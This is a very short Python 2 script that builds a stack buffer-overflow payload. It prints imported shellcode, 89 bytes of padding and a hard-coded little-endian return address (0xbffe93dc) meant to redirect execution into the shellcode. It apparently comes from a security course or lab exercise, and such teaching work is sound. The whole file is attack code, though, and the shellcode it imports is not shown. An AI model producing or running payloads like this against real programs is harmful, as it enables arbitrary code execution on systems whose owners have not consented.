from shellcode import shellcode
from struct import pack

def main():
	print shellcode + "\x07"*89 + pack("<I", 0xbffe93dc)
	#print shellcode

if __name__ == '__main__':
	main()
